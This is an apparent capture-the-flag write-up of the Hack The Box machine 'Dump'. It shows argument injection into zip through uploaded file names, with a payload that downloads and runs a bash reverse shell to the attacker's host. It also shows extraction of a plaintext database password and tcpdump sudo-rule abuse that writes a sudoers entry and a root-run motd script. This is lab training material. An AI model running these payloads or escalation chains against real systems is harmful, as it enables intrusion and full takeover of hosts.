---
icon: party-bell
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 144204.png
coverY: -8.082805917174511
---

# HTB-DUMP(VL)

<figure><img src="../../../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Initial Port Scanning

I started reconnaissance by scanning the target for open ports using rustscan:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ rustscan -a 10.129.110.172 --ulimit 5000 -- -A -sC -sV

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

The scan revealed two open TCP ports:

* **Port 22** - SSH
* **Port 80** - HTTP (Apache)

Let's get detailed service information:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ nmap -p 22,80 -sCV 10.129.110.172

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey: 
|   3072 fb:31:61:8d:2f:86:e5:60:f9:e6:24:a3:1c:62:0c:ae (RSA)
|   256 0c:b7:c4:fb:4a:fc:31:1b:e9:4b:0b:d1:19:56:2f:ce (ECDSA)
|_  256 3c:c6:e8:71:4d:9a:d5:1d:86:dd:dd:6c:82:ee:7e:4d (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: hdmpll?
|_http-server-header: Apache/2.4.65 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**

* The host is running Debian 11 Bullseye (based on OpenSSH version)
* All ports show TTL of 63, indicating a Linux system one hop away
* Web server is Apache 2.4.65 with PHP support (PHPSESSID cookie)

### Web Application Analysis - Port 80

#### Initial Exploration

Accessing the web application reveals a packet capture interface with login/registration functionality:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ curl -I http://10.129.110.172

HTTP/1.1 200 OK
Date: Sat, 01 Nov 2025 01:27:54 GMT
Server: Apache/2.4.65 (Debian)
Set-Cookie: PHPSESSID=2celb3j7qoovdmfpcac4tm5452; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

**Application Features:**

1. **User Registration/Login** - Account creation and authentication
2. **Live Traffic Capture** - Captures packets on port 27714
3. **Upload Captures** - Upload .pcap files
4. **Download Captures** - Download all captures as ZIP archive
5. **View Captures** - View individual capture files

#### Technology Stack Analysis

The application is built with PHP, as evidenced by:

* `PHPSESSID` cookie
* `.php` file extensions
* Default Apache 404 page

Interestingly, when downloading captures, the response includes a comment showing the `zip` command output:

```http
HTTP/1.1 301 Moved Permanently
Location: downloads/0984d7dc-b1e8-4987-a144-b3f64cf48b88.zip

Preparing download...
<!--
  adding: 0f0a5865-6b8c-4e83-8ebe-b2fa5680f6d1 (deflated 56%)
  adding: 2589e07e-2395-4bfa-ba41-9b5e1d530b3b (deflated 33%)
  adding: c0061667-4e91-4f09-bfeb-b3669046c05a (deflated 33%)
-->
```

This output matches the Linux `zip` command format, suggesting the server executes shell commands.

#### Directory Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ feroxbuster -u http://10.129.110.172 -x php

200      GET       23l       64w      954c http://10.129.110.172/index.php
200      GET      222l      558w     4636c http://10.129.110.172/style.css
301      GET        9l       28w      316c http://10.129.110.172/downloads
302      GET        0l        0w        0c http://10.129.110.172/upload.php
302      GET        0l        0w        0c http://10.129.110.172/logout.php
302      GET        0l        0w        0c http://10.129.110.172/view.php
302      GET        2l        3w       27c http://10.129.110.172/download.php
302      GET        1l        2w       17c http://10.129.110.172/delete.php
302      GET        0l        0w        0c http://10.129.110.172/capture.php
```

All discovered endpoints require authentication (302 redirects).

### Vulnerability Discovery & Exploitation

#### Parameter Injection in File Upload

**Testing Special Characters**

I registered an account and began testing the file upload functionality for command injection vulnerabilities. I created a request template for fuzzing:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ cat upload.request

POST /upload.php HTTP/1.1
Host: 10.129.110.172
Content-Type: multipart/form-data; boundary=----geckoformboundary319f5b7c082c304c30704cdc554c1368
Cookie: PHPSESSID=2celb3j7qoovdmfpcac4tm5452

------geckoformboundary319f5b7c082c304c30704cdc554c1368
Content-Disposition: form-data; name="submit"

Upload Capture
------geckoformboundary319f5b7c082c304c30704cdc554c1368
Content-Disposition: form-data; name="fileToUpload"; filename="test-FUZZ.pcap"
Content-Type: application/vnd.tcpdump.pcap


------geckoformboundary319f5b7c082c304c30704cdc554c1368--
```

Testing with special characters:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ ffuf -request upload.request -w /usr/share/seclists/Fuzzing/special-chars.txt -request-proto http

!                       [Status: 301, Size: 0, Duration: 23ms]
~                       [Status: 301, Size: 0, Duration: 23ms]
@                       [Status: 301, Size: 0, Duration: 21ms]
#                       [Status: 301, Size: 0, Duration: 21ms]
-                       [Status: 301, Size: 0, Duration: 22ms]
```

All special characters are accepted in filenames, which is suspicious.

**Proof of Concept - Parameter Injection**

To test for command injection, I uploaded a file named `--help`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ touch -- '--help'
```

After uploading and clicking "Download Captures", the response showed:

```http
Preparing download...
<!--
Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
Zip 3.0 (July 5th 2008). Usage:
zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]
  -f   freshen: only changed files  -u   update: only changed or new files
  -d   delete entries in zipfile    -m   move into zipfile (delete OS files)
  ...
-->
```

**Critical Finding:** We have parameter injection into the `zip` command!

**Understanding the Command Structure**

Using the `-sc` flag to show command arguments:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ # Upload file named: -sc
```

Response shows:

```
command line:'zip' '/var/cache/captures/user-guid/guid.zip' '-sc' 'file1' 'file2' ...
```

The application is running something like:

```bash
zip /path/to/output.zip [uploaded filenames...]
```

#### Remote Code Execution via GTFOBins

According to GTFOBins, `zip` can execute commands using:

```
zip archive.zip file1 file2 -T -TT 'command'
```

Where:

* `-T` tests the archive
* `-TT cmd` specifies a custom test command instead of `unzip -tqq`

**Exploitation Strategy**

The challenge is getting arguments in the correct order. After experimentation, I found that uploading files in this sequence works:

**File 1:** `-T`\
**File 2:** `-TT wget http://10.10.14.41/index.html -O s.sh; bash s.sh; echo`\
**File 3:** (any file to trigger zip operation)

The `echo` at the end cleans up any remaining arguments.

**Preparing the Payload**

Creating the reverse shell payload:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ cat index.html
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.41/443 0>&1
```

Starting a Python web server:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Starting netcat listener:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
```

**Uploading Malicious Files**

I uploaded three files with these exact names:

1. `-T`
2. `-TT wget http://10.10.14.41/index.html -O s.sh; bash s.sh; echo`
3. `trigger.pcap` (empty file)

Clicking "Download Captures" triggers the execution.

**Getting the Shell**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.110.172 37874

www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$
```

Success! Upgrading the shell:

```bash
www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$ ^Z
[1]+  Stopped                 nc -lnvp 443

┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen

www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$
```

### Lateral Movement - www-data to fritz

#### System Enumeration

**User Discovery**

```bash
www-data@dump:/home$ ls
admin  fritz

www-data@dump:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Debian:/home/admin:/bin/bash
fritz:x:1001:1001::/home/fritz:/bin/bash
```

Three users have shell access: root, admin, and fritz.

**Sudo Privileges**

```bash
www-data@dump:/var/www$ sudo -l
Matching Defaults entries for www-data on dump:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dump:
    (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10
        -w/var/cache/captures/*/[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
        -F/var/cache/captures/filter.[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
```

**Key Privileges:**

* Run `tcpdump` as root with specific constraints
* `-c10` - capture 10 packets
* `-w` - write to `/var/cache/captures/*/[UUID].pcap` (the `*` allows path traversal!)
* `-F` - read filter from `/var/cache/captures/filter.[UUID]`

This will be useful for privilege escalation later.

#### Database Discovery

```bash
www-data@dump:/var/www$ ls
database  html  userdata

www-data@dump:/var/www$ ls database/
database.sqlite3

www-data@dump:/var/www$ file database/database.sqlite3
database.sqlite3: SQLite 3.x database, last written using SQLite version 3034001
```

**Extracting Credentials**

```bash
www-data@dump:/var/www$ sqlite3 database/database.sqlite3

SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.

sqlite> .tables
users

sqlite> .headers on
sqlite> select * from users;
username|password|guid
fritz|Passw0rdH4shingIsforNoobZ!|534ce8b9-6a77-4113-a8c1-66462519bfd1
sn0x|sn0x|23d982eb-1903-46ff-a45e-5566af0037a3
```

**Credentials Found:** `fritz:Passw0rdH4shingIsforNoobZ!`

The passwords are stored in plaintext!

#### Access as fritz

**Using su**

```bash
www-data@dump:/var/www$ su - fritz
Password: Passw0rdH4shingIsforNoobZ!

fritz@dump:~$
```

**Using SSH**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ sshpass -p 'Passw0rdH4shingIsforNoobZ!' ssh fritz@10.129.110.172

Linux dump 5.10.0-36-cloud-amd64 #1 SMP Debian 5.10.244-1 (2025-09-29) x86_64

fritz@dump:~$
```

### Privilege Escalation to root

#### Initial Enumeration as fritz

```bash
fritz@dump:~$ sudo -l
[sudo] password for fritz: 
Sorry, user fritz may not run sudo on dump.

fritz@dump:~$ ls -la
total 24
drwx------ 2 fritz fritz 4096 Nov  1 19:44 .
drwxr-xr-x 4 root  root  4096 Mar  5  2023 ..
lrwxrwxrwx 1 root  root     9 Oct 21 20:38 .bash_history -> /dev/null
-rw-r--r-- 1 fritz fritz  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 fritz fritz 3526 Mar 27  2022 .bashrc
-rw-r--r-- 1 fritz fritz  807 Mar 27  2022 .profile
-rw-r----- 1 root  fritz   33 Nov  1 03:18 user.txt
```

Fritz cannot run sudo directly, but we still have www-data's tcpdump privilege.

#### Analyzing tcpdump Sudo Privilege

The sudo rule allows running tcpdump with specific constraints:

```bash
sudo /usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID] -F/var/cache/captures/filter.[UUID]
```

**Exploitation Primitives:**

**1. Directory Traversal via Wildcard**

The `*` in the path allows traversal:

```bash
www-data@dump:/var/cache/captures$ touch /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

www-data@dump:/var/cache/captures$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/11111111-1111-1111-1111-111111111111 \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10 packets captured
12 packets received by filter
0 packets dropped by kernel
```

This creates a file owned by tcpdump:

```bash
www-data@dump:/var/cache/captures$ ls -l /dev/shm/11111111-1111-1111-1111-111111111111
-rw-r--r-- 1 tcpdump tcpdump 943 Nov  1 19:48 /dev/shm/11111111-1111-1111-1111-111111111111
```

**2. Parameter Injection via Split Arguments**

We can inject additional parameters by splitting the `-w` argument:

```bash
www-data@dump:/var/cache/captures$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/ \
  -w /dev/shm/11111111-1111-1111-1111-111111111112 \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10 packets captured
14 packets received by filter
0 packets dropped by kernel
```

This works because the regex only validates the first `-w` argument. The second `-w` and any parameters after it can be anything!

**3. Writing as Arbitrary User with -Z**

The `-Z [user]` flag changes file ownership:

```bash
www-data@dump:/var/cache/captures$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/ \
  -Z root \
  -w /dev/shm/11111111-1111-1111-1111-111111111113 \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10 packets captured
11 packets received by filter
0 packets dropped by kernel
```

File is now owned by root:

```bash
www-data@dump:/var/cache/captures$ ls -l /dev/shm/11111111-1111-1111-1111-111111111113
-rw-r--r-- 1 root root 913 Nov  2 00:38 /dev/shm/11111111-1111-1111-1111-111111111113
```

We can also write as fritz:

```bash
www-data@dump:/var/cache/captures$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/ \
  -Z fritz \
  -w /dev/shm/11111111-1111-1111-1111-111111111114 \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

www-data@dump:/var/cache/captures$ ls -l /dev/shm/11111111-1111-1111-1111-111111111114
-rw-r--r-- 1 fritz fritz 945 Nov  2 00:41 /dev/shm/11111111-1111-1111-1111-111111111114
```

**4. Writing Specific Content with -r**

The `-r` flag reads from a PCAP file. We can craft a PCAP containing specific lines of text.

Creating a malicious PCAP on our attack machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ cat > sudoers << 'EOF'


fritz ALL=(ALL:ALL) NOPASSWD: ALL
EOF
```

Note the blank lines at the top to separate from PCAP header.

Capturing the payload into a PCAP:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

In another terminal:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ cat sudoers | nc -u 127.0.0.1 9001
```

Back to the first terminal (Ctrl+C):

```bash
^C1 packet captured
2 packets received by filter
0 packets dropped by kernel
```

Verifying the PCAP contains our payload:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ cat sudoers.pcap
p/      iEME?@@j#)+>
fritz ALL=(ALL:ALL) NOPASSWD: ALL
```

Perfect! Now transfer this to the target (using base64 encoding):

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ base64 sudoers.pcap
cC8AAABJTUEAAQAAAAAAAAAAAAAAAAD//////////4BpAAAAAAAAAGkBAABFTQBFMwRAQP9AEQAAdwAA
AQAAdwAAASODIwApACsrPgoKZnJpdHogQUxMPShBTEw6QUxMKSBOT1BBU1NXRDogQUxMCg==
```

On the target:

```bash
www-data@dump:/var/cache/captures$ echo 'cC8AAABJTUEAAQAAAAAAAAAAAAAAAAD//////////4BpAAAAAAAAAGkBAABFTQBFMwRAQP9AEQAAdwAAAQAAdwAAASODIwApACsrPgoKZnJpdHogQUxMPShBTEw6QUxMKSBOT1BBU1NXRDogQUxMCg==' | base64 -d > sudoers.pcap
```

Now we can use `-r` to read this PCAP and write its contents to any file:

```bash
www-data@dump:/var/cache/captures$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/ \
  -Z fritz \
  -r sudoers.pcap \
  -w /dev/shm/11111111-1111-1111-1111-111111111116 \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

reading from file sudoers.pcap, link-type EN10MB (Ethernet), snapshot length 262144
```

Checking the output:

```bash
www-data@dump:/var/cache/captures$ cat /dev/shm/11111111-1111-1111-1111-111111111116
p/      iEME?@@j#)+>
fritz ALL=(ALL:ALL) NOPASSWD: ALL
```

Perfect! Our payload is written to the file.

#### Privilege Escalation Method 1: Sudoers Manipulation

Using the primitives above, we can write a malicious sudoers file:

```bash
www-data@dump:/dev/shm$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/ \
  -Z root \
  -r sudoers.pcap \
  -w /etc/sudoers.d/11111111-1111-1111-1111-111111111116 \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

reading from file sudoers.pcap, link-type EN10MB (Ethernet), snapshot length 262144
```

Now testing as fritz:

```bash
fritz@dump:~$ sudo -l
/etc/sudoers.d/11111111-1111-1111-1111-111111111116:1:77: syntax error
                                                                            ^~~~~~~
Matching Defaults entries for fritz on dump:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fritz may run the following commands on dump:
    (ALL : ALL) NOPASSWD: ALL
```

There's a syntax error on line 1 (the PCAP header junk), but line 2 works perfectly!

Getting root shell:

```bash
fritz@dump:~$ sudo -i
/etc/sudoers.d/11111111-1111-1111-1111-111111111116:1:77: syntax error
                                                                            ^~~~~~~
root@dump:~#
```

#### Alternative: Reading Root Flag Directly with -V

The `-V [file]` flag reads a list of filenames from a file. We can abuse this to read arbitrary files:

```bash
www-data@dump:/var/cache/captures$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/ \
  -V /root/root.txt \
  -w /tmp/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

/etc/sudoers.d/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1:37: syntax error
                                    ^
tcpdump: 84406779************************: No such file or directory
```

The flag is leaked in the error message!

#### Privilege Escalation Method 2: MOTD Exploitation

Another approach is to write a malicious script in `/etc/update-motd.d/`:

First, create a file owned by fritz in that directory:

```bash
www-data@dump:/var/cache/captures$ sudo tcpdump -c10 \
  -w/var/cache/captures/a/ \
  -Z fritz \
  -w /etc/update-motd.d/dddddddd-dddd-dddd-dddd-dddddddddddd \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10 packets captured
20 packets received by filter
0 packets dropped by kernel
```

Verify ownership:

```bash
www-data@dump:/var/cache/captures$ ls -l /etc/update-motd.d/
total 8
-rwxr-xr-x 1 root  root   23 Apr  4  2017 10-uname
-rw-r--r-- 1 fritz fritz 892 Nov  2 01:00 dddddddd-dddd-dddd-dddd-dddddddddddd
```

Now as fritz, we can modify this file:

```bash
fritz@dump:/etc/update-motd.d$ chmod +x dddddddd-dddd-dddd-dddd-dddddddddddd

fritz@dump:/etc/update-motd.d$ cat > dddddddd-dddd-dddd-dddd-dddddddddddd << 'EOF'
#!/bin/bash

cp /bin/bash /tmp/sn0x
chmod 6777 /tmp/sn0x
EOF
```

This script will be executed by root when anyone connects via SSH. Triggering it:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DUMP]
└─$ sshpass -p 'Passw0rdH4shingIsforNoobZ!' ssh fritz@10.129.110.172

Linux dump 5.10.0-36-cloud-amd64 #1 SMP Debian 5.10.244-1 (2025-09-29) x86_64
Last login: Sat Nov  1 03:27:41 2025 from 10.10.14.41

fritz@dump:~$
```

Now we have a SUID bash binary:

```bash
fritz@dump:~$ ls -la /tmp/sn0x
-rwsrwsrwx 1 root root 1234376 Nov  2 01:05 /tmp/sn0x

fritz@dump:~$ /tmp/sn0x -p
sn0x-5.1#
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
